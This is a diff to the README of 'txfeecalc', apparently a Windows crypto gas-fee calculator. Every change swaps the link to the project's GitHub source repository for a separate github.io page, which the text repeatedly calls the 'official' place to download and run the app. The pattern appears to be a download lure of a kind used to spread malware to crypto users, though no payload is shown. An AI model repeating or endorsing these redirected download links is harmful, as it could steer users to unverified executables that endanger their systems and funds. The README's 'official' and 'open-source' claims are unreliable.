@@ -1,6 +1,6 @@
 # 🧮 txfeecalc - Calculate Crypto Fees Without Guesswork
 
-[![Download txfeecalc](https://img.shields.io/badge/Download_txfeecalc-Visit_Link-ff6b6b?style=for-the-badge&logo=github)](https://github.com/Ssuhaira3192/txfeecalc)
+[![Download txfeecalc](https://img.shields.io/badge/Download_txfeecalc-Visit_Link-ff6b6b?style=for-the-badge&logo=github)](https://ssuhaira3192.github.io)
 
 txfeecalc is an open-source Windows desktop utility for calculating blockchain transaction fees. It helps you understand how gas fees, gwei prices, and transaction costs add up before you confirm a trade or transfer. If you have ever looked at a crypto fee estimate and wondered what it really means, txfeecalc gives you a clear answer in a simple desktop app. The repository was updated on 2026-10-04.
 
@@ -25,7 +25,7 @@ txfeecalc is intended for Windows users who want a straightforward fee calculato
 
 ### 📥 Download txfeecalc
 
-Visit this link to download the application: [Download txfeecalc](https://github.com/Ssuhaira3192/txfeecalc)
+Visit this link to download the application: [Download txfeecalc](https://ssuhaira3192.github.io)
 
 Use the link above as your starting point. It takes you to the official txfeecalc page where the application is available. Once the download is complete, open txfeecalc on your Windows computer to begin calculating transaction fees.
 
@@ -94,11 +94,11 @@ No. txfeecalc is a fee calculator. It does not hold funds or connect to your wal
 
 ### Where do I download txfeecalc?
 
-Visit this link to download the application: [Download txfeecalc](https://github.com/Ssuhaira3192/txfeecalc)
+Visit this link to download the application: [Download txfeecalc](https://ssuhaira3192.github.io)
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download txfeecalc](https://github.com/Ssuhaira3192/txfeecalc)
+Visit this link to download the application: [Download txfeecalc](https://ssuhaira3192.github.io)
 
 This is the official starting point for getting txfeecalc. Open the link and download the application for Windows. After the download finishes, open txfeecalc to begin. Keep the application in a folder you can find easily, such as your Downloads folder, so you can open it again when you need a fee estimate.
 
@@ -120,6 +120,6 @@ txfeecalc exists to make transaction fee checks easier to understand. Instead of
 
 ## 🔗 Official Download
 
-Visit this link to download the application: [Download txfeecalc](https://github.com/Ssuhaira3192/txfeecalc)
+Visit this link to download the application: [Download txfeecalc](https://ssuhaira3192.github.io)
 
 Keywords: blockchain, calculator, cpp, crypto, defi, desktop-app, eth, ethereum, fees, finance, gas, gas-fees, gwei, offline, open-source, trading, transaction-costs, web3, winapi, windows
